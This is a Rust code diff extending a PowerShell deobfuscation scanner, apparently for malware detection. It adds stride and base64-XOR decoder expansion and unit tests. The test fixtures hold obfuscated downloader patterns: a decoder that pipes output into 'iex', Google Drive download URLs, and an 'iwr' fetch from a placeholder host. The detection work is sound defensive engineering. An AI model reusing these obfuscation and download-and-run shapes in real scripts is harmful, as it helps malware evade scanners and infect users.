@@ -2976,7 +2976,7 @@ static SKIP_NTH_DEF_RE: Lazy<Regex> = Lazy::new(|| {
     // Captures: group 1 = fn name from `function NAME`, group 2 = fn name from `-n/-Name NAME`
     // The body must contain a do{...} until loop with $idx += N pattern.
     Regex::new(
-        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{([^{}]*?do\s*\{[^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}[^{}]*?until[^{}]*?)\}"#
+        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{([^{}]*?do\s*\{[^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}[^{}]*?(?:until|while)[^{}]*?)\}"#
     ).expect("skip-nth def")
 });
 
@@ -2984,6 +2984,31 @@ static SKIP_NTH_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 static SKIP_NTH_INIT_RE: Lazy<Regex> = Lazy::new(|| {
     // Extracts: $idx = N (initializer before the loop)
     Regex::new(r#"\$(\w+)\s*=\s*(\d+)"#).expect("skip-nth init")
+});
+
+#[allow(clippy::expect_used)]
+static PS_NUMERIC_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d{1,6})\b"#).expect("ps numeric assign regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_NUMERIC_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@\(\s*([0-9,\s]{3,512})\)"#)
+        .expect("ps numeric array assign regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_FUNCTION_HEAD_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_]*)\s*\([^)]*\)\s*\{"#)
+        .expect("ps function head regex")
+});
+
+#[allow(clippy::expect_used)]
+static SKIP_NTH_SUM_INIT_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\+\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
+    )
+    .expect("skip-nth sum init regex")
 });
 
 #[allow(clippy::expect_used)]
@@ -3068,6 +3093,117 @@ fn is_ident_byte(byte: Option<u8>) -> bool {
     byte.is_some_and(|b| b.is_ascii_alphanumeric() || b == b'_')
 }
 
+fn ps_numeric_bindings(text: &str) -> std::collections::HashMap<String, usize> {
+    PS_NUMERIC_ASSIGN_RE
+        .captures_iter(text)
+        .filter_map(|caps| {
+            let name = caps.get(1)?.as_str().to_ascii_lowercase();
+            let value = caps.get(2)?.as_str().parse().ok()?;
+            Some((name, value))
+        })
+        .collect()
+}
+
+fn ps_numeric_array_bindings(text: &str) -> std::collections::HashMap<String, Vec<u8>> {
+    PS_NUMERIC_ARRAY_ASSIGN_RE
+        .captures_iter(text)
+        .filter_map(|caps| {
+            let name = caps.get(1)?.as_str().to_ascii_lowercase();
+            let values: Option<Vec<u8>> = caps
+                .get(2)?
+                .as_str()
+                .split(',')
+                .map(|part| part.trim().parse::<u8>().ok())
+                .collect();
+            let values = values?;
+            if values.is_empty() || values.len() > 128 {
+                return None;
+            }
+            Some((name, values))
+        })
+        .collect()
+}
+
+fn ps_function_bodies(text: &str) -> Vec<(String, String)> {
+    PS_FUNCTION_HEAD_RE
+        .captures_iter(text)
+        .filter_map(|caps| {
+            let name = caps.get(1)?.as_str().to_string();
+            let open = caps.get(0)?.end().checked_sub(1)?;
+            let end = matching_ps_brace(text, open)?;
+            Some((name, text[open + 1..end].to_string()))
+        })
+        .collect()
+}
+
+fn matching_ps_brace(text: &str, open: usize) -> Option<usize> {
+    let bytes = text.as_bytes();
+    if bytes.get(open) != Some(&b'{') {
+        return None;
+    }
+    let mut depth = 0usize;
+    let mut pos = open;
+    while pos < bytes.len() {
+        match bytes[pos] {
+            b'\'' | b'"' => {
+                let quote = bytes[pos];
+                pos += 1;
+                while pos < bytes.len() {
+                    if bytes[pos] == quote {
+                        if quote == b'\'' && bytes.get(pos + 1) == Some(&b'\'') {
+                            pos += 2;
+                            continue;
+                        }
+                        break;
+                    }
+                    pos += 1;
+                }
+            }
+            b'{' => depth = depth.saturating_add(1),
+            b'}' => {
+                depth = depth.checked_sub(1)?;
+                if depth == 0 {
+                    return Some(pos);
+                }
+            }
+            _ => {}
+        }
+        pos += 1;
+    }
+    None
+}
+
+fn skip_nth_start_index(
+    body: &str,
+    idx_var: &str,
+    numeric_bindings: &std::collections::HashMap<String, usize>,
+) -> Option<usize> {
+    if let Some(start) = SKIP_NTH_INIT_RE
+        .captures_iter(body)
+        .find(|caps| caps.get(1).map(|m| m.as_str()) == Some(idx_var))
+        .and_then(|caps| caps.get(2)?.as_str().parse().ok())
+    {
+        return Some(start);
+    }
+
+    for caps in SKIP_NTH_SUM_INIT_RE.captures_iter(body) {
+        let Some(lhs) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !lhs.eq_ignore_ascii_case(idx_var) {
+            continue;
+        }
+        let left = caps.get(2)?.as_str().to_ascii_lowercase();
+        let right = caps.get(3)?.as_str().to_ascii_lowercase();
+        let start = numeric_bindings
+            .get(&left)?
+            .checked_add(*numeric_bindings.get(&right)?)?;
+        return Some(start);
+    }
+
+    None
+}
+
 fn skip_ascii_ws(bytes: &[u8], mut pos: usize) -> usize {
     while bytes.get(pos).is_some_and(|b| b.is_ascii_whitespace()) {
         pos += 1;
@@ -3121,6 +3257,7 @@ static MUSCULOS_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 
 fn expand_skip_nth(text: &str) -> String {
     let mut out = text.to_string();
+    let numeric_bindings = ps_numeric_bindings(text);
     // Collect all function definitions with their skip parameters
     let defs: Vec<(String, usize, usize)> = SKIP_NTH_DEF_RE
         .captures_iter(text)
@@ -3140,12 +3277,8 @@ fn expand_skip_nth(text: &str) -> String {
             // Find start index: look for $VAR = N initializer in the body
             // The init variable should match the step variable (group 4)
             let idx_var = caps.get(4)?.as_str();
-            let start: usize = SKIP_NTH_INIT_RE
-                .captures_iter(body)
-                .find(|c| c.get(1).map(|m| m.as_str()) == Some(idx_var))
-                .and_then(|c| c.get(2)?.as_str().parse().ok())
-                .unwrap_or(1);
-            if start > 10 {
+            let start = skip_nth_start_index(body, idx_var, &numeric_bindings).unwrap_or(1);
+            if start > 512 {
                 return None;
             }
             Some((fn_name, start, step))
@@ -3200,6 +3333,89 @@ fn expand_skip_nth(text: &str) -> String {
             out.replace_range(start_pos..end_pos, &replacement);
         }
     }
+    out
+}
+
+fn expand_base64_xor_array_function_calls(text: &str) -> String {
+    let key_arrays = ps_numeric_array_bindings(text);
+    if key_arrays.is_empty() {
+        return text.to_string();
+    }
+
+    let decoder_defs: Vec<(String, Vec<u8>)> = ps_function_bodies(text)
+        .into_iter()
+        .filter_map(|(name, body)| {
+            let lower = body.to_ascii_lowercase();
+            if !lower.contains("frombase64string")
+                || !lower.contains("getstring")
+                || !lower.contains("for")
+                || !lower.contains('%')
+            {
+                return None;
+            }
+            let key = key_arrays.iter().find_map(|(key_name, key)| {
+                if contains_ascii_case_insensitive_bytes(&body, format!("${key_name}").as_bytes()) {
+                    Some(key.clone())
+                } else {
+                    None
+                }
+            })?;
+            Some((name, key))
+        })
+        .collect();
+    if decoder_defs.is_empty() {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, key) in decoder_defs {
+        let call_re_str = format!(
+            r#"(?i)(?:^|[^\w]){}\s*(?:\(\s*)?['"]([A-Za-z0-9+/=]{{4,4096}})['"](?:\s*,?\s*\d+)?\s*\)?"#,
+            regex::escape(&name)
+        );
+        let Ok(call_re) = Regex::new(&call_re_str) else {
+            continue;
+        };
+        let matches: Vec<(usize, usize, String)> = call_re
+            .captures_iter(&out)
+            .filter_map(|caps| {
+                let full = caps.get(0)?;
+                let encoded = caps.get(1)?.as_str();
+                let raw_match = full.as_str();
+                let name_start = raw_match
+                    .find(|ch: char| ch.is_alphanumeric() || ch == '_')
+                    .unwrap_or(0);
+                let prefix = &raw_match[..name_start];
+                let decoded = base64::engine::general_purpose::STANDARD
+                    .decode(encoded.as_bytes())
+                    .ok()?;
+                if decoded.len() > 1024 * 1024 {
+                    return None;
+                }
+                let plain: Vec<u8> = decoded
+                    .into_iter()
+                    .enumerate()
+                    .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                    .collect();
+                let text = String::from_utf8_lossy(&plain);
+                if !should_inline_base64_decoded_payload(text.as_bytes())
+                    && !contains_ascii_case_insensitive_bytes(&text, b"drive.")
+                    && !contains_ascii_case_insensitive_bytes(&text, b"download")
+                {
+                    return None;
+                }
+                Some((
+                    full.start(),
+                    full.end(),
+                    format!("{}'{}'", prefix, text.replace('\'', "''")),
+                ))
+            })
+            .collect();
+        for (start, end, replacement) in matches.into_iter().rev() {
+            out.replace_range(start..end, &replacement);
+        }
+    }
+
     out
 }
 
@@ -3401,6 +3617,7 @@ fn expand_obfuscation(text: &str) -> String {
         profile_expand_step!("skip_nth", iter, {
             if signals.skip_nth {
                 out = expand_skip_nth(&out); // skip-nth-char decoder (Pattern B)
+                out = expand_base64_xor_array_function_calls(&out);
                 out = expand_skip_nth_for_substring(&out);
             }
         });
@@ -3447,6 +3664,7 @@ fn expand_obfuscation(text: &str) -> String {
                 out = expand_regex_replace_calls(&out);
             }
             if signals.base64_or_getstring {
+                out = expand_base64_xor_array_function_calls(&out);
                 out = expand_getstring_base64_literals(&out);
                 out = expand_getstring_base64_variables(&out);
                 out = expand_getstring_byte_arrays(&out);
@@ -3508,6 +3726,7 @@ fn expand_obfuscation(text: &str) -> String {
                     out = expand_unary_join_char_arrays(&out);
                 }
                 if signals.base64_or_getstring {
+                    out = expand_base64_xor_array_function_calls(&out);
                     out = expand_getstring_base64_literals(&out);
                     out = expand_getstring_base64_variables(&out);
                     out = expand_getstring_byte_arrays(&out);
@@ -3566,7 +3785,9 @@ impl PsObfuscationSignals {
         let doubled_single_quote = text.contains("''");
         let skip_nth = has_function_def
             && lower.contains("+=")
-            && ((lower.contains("do") && lower.contains("until") && text.contains('['))
+            && ((lower.contains("do")
+                && (lower.contains("until") || lower.contains("while"))
+                && text.contains('['))
                 || (lower.contains("for") && lower.contains("invoke") && text.contains("'su'")));
         let char_cast = lower.contains("[char");
         let hex_split = lower.contains("-split") && lower.contains("toint16");
@@ -4713,6 +4934,12 @@ mod herestring_iex_tests {
     }
 
     #[test]
+    fn inline_powershell_gate_allows_quoted_function_body_without_flag() {
+        let text = r#"Powershell "function Decode($x){$i=0;do{$o+=$x[$i];$i+=2}while($x[$i])$o};Decode 'xpxs'""#;
+        assert!(inline_powershell_text_has_payload_signal(text));
+    }
+
+    #[test]
     fn inline_powershell_large_launch_text_uses_candidate_lines() {
         let mut text = "rem filler\r\n".repeat(60_000);
         text.push_str("powershell.exe -Command \"iwr https://inline-candidate.example/a\"\r\n");
@@ -5581,7 +5808,10 @@ fn inline_powershell_launch_line_has_payload_signal(line: &str) -> bool {
         && (line_has_powershell_payload_flag(line)
             || contains_ascii_case_insensitive_bytes(line, b"http://")
             || contains_ascii_case_insensitive_bytes(line, b"https://")
-            || contains_ascii_case_insensitive_bytes(line, b"iex "))
+            || contains_ascii_case_insensitive_bytes(line, b"iex ")
+            || (contains_ascii_case_insensitive_bytes(line, b"function ")
+                && line.contains('$')
+                && (line.contains('"') || line.contains('\''))))
 }
 
 fn line_has_powershell_payload_flag(line: &str) -> bool {
@@ -5628,7 +5858,16 @@ mod dynamic_download_invoke_tests {
 
 #[cfg(test)]
 mod skip_nth_signal_tests {
-    use super::PsObfuscationSignals;
+    use super::{normalize_ps1_text, PsObfuscationSignals};
+    use base64::Engine as _;
+
+    fn stride_carrier(decoded: &str, start: usize, step: usize) -> String {
+        let mut chars = vec!['x'; start + decoded.chars().count().saturating_mul(step)];
+        for (idx, ch) in decoded.chars().enumerate() {
+            chars[start + idx * step] = ch;
+        }
+        chars.into_iter().collect()
+    }
 
     #[test]
     fn skip_nth_signal_blocks_generic_function_loops() {
@@ -5653,6 +5892,58 @@ mod skip_nth_signal_tests {
             "function Decode($x){for($i=2;$i -lt $x.Length;$i+=3){$out+=$x.'su'.'Invoke'($i,1)}$out}",
         );
         assert!(substring.skip_nth, "substring stride decoder was blocked");
+    }
+
+    #[test]
+    fn skip_nth_decoder_allows_constant_sum_start_offsets() {
+        let carrier = stride_carrier("https://drive.google.com/uc", 59, 5);
+        let script = format!(
+            "$a=4;$b=55;function Decode($x){{$i=$a+$b;do{{$out+=$x[$i];$i+=5}}while($x[$i])$out}};Decode '{carrier}'"
+        );
+
+        let normalized = normalize_ps1_text(&script);
+
+        assert!(
+            normalized.contains("https://drive.google.com/uc"),
+            "computed-start stride decoder did not expand:\n{normalized}"
+        );
+    }
+
+    #[test]
+    fn skip_nth_decoder_allows_real_family_call_shape() {
+        let carrier = stride_carrier("[int]$trosretninger145 -bx", 59, 5);
+        let script = format!(
+            "$preeditorially=4;$tungetalerens=55;function helligaanden ($pauver) {{ $legman8=$preeditorially+$tungetalerens;\tdo  {{$mitraille+=$pauver[$legman8];$legman8+=5}} while  ($pauver[$legman8])$mitraille}};$x=helligaanden('{carrier}')"
+        );
+
+        let normalized = normalize_ps1_text(&script);
+
+        assert!(
+            normalized.contains("[int]$trosretninger145 -bx"),
+            "real-family stride call did not expand:\n{normalized}"
+        );
+    }
+
+    #[test]
+    fn ps_base64_xor_array_function_calls_are_decoded() {
+        let key = [117u8, 107, 110, 107, 107, 101, 108, 105, 103, 101, 115];
+        let plain = "https://drive.google.com/uc?export=download&id=abc";
+        let encoded: Vec<u8> = plain
+            .bytes()
+            .enumerate()
+            .map(|(idx, byte)| byte ^ key[idx % key.len()])
+            .collect();
+        let encoded = base64::engine::general_purpose::STANDARD.encode(encoded);
+        let script = format!(
+            "$key=@(117,107,110,107,107,101,108,105,103,101,115);function Decode($s,$run=0){{$bytes=[Convert]::FromBase64String($s);for($i=0;$bytes[$i] -ne $null;$i++){{$bytes[$i]=Xor $bytes[$i] $key[$i%11]}}$out=[Text.Encoding]::ASCII.GetString($bytes);if($run){{iex $out}}else{{$out}}}};Decode '{encoded}' 1"
+        );
+
+        let normalized = normalize_ps1_text(&script);
+
+        assert!(
+            normalized.contains(plain),
+            "base64 XOR array function call did not decode:\n{normalized}"
+        );
     }
 }
 
